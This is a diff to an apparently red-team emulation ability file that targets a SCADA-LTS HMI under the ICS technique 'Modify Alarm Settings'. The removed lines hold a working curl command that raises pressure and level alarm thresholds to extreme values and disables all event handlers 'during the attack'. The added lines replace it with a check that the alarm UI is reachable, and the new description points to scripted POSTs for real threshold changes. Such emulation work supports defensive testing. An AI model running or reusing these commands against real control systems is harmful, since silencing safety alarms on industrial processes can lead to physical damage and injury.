@@ -3,9 +3,9 @@
 - id: a7b8c9d0-7777-7777-7777-000000000003
   name: SCADA-LTS - Raise Alarm Thresholds to Disable Alerts
   description: |
-    Use SCADA-LTS API to modify alarm settings on pressure and
-    level data points, raising thresholds so high that no alarm
-    will ever trigger during the attack.
+    REST endpoints for alarm mutation vary by version. This ability verifies access to
+    event-handling UI (event_handlers.shtm, compound_events.shtm). For real threshold
+    changes, use the web UI or scripted POSTs captured from browser DevTools.
   tactic: inhibit-response-function
   technique_id: T0838
   technique_name: Modify Alarm Settings
@@ -13,12 +13,8 @@
   - platform: linux
     name: sh
     command: >
-      HMI="http://192.168.90.107:8080/ScadaBR" &&
-      curl -s -b /tmp/hmi.jar -X PUT "$HMI/api/event-detectors"
-      -H "Content-Type: application/json"
-      -d '{"highLimit": 999999, "lowLimit": -999999, "alarmLevel": "NONE"}'
-      2>/dev/null &&
-      echo "ALARM_THRESHOLDS_RAISED" &&
-      curl -s -b /tmp/hmi.jar -X POST "$HMI/api/event-handlers/disable-all"
-      2>/dev/null &&
-      echo "ALARM_HANDLERS_DISABLED"
+      curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/event_handlers.shtm" -o /tmp/hmi_eh.html &&
+      curl -s -b /tmp/hmi_cookies.txt "http://192.168.90.107:8080/compound_events.shtm" -o /tmp/hmi_ce.html &&
+      grep -qiE "Event|Handler|Alarm|detector" /tmp/hmi_eh.html &&
+      echo "HMI_ALARM_UI_REACHABLE" || echo "HMI_ALARM_UI_UNCERTAIN"
+    timeout: 45
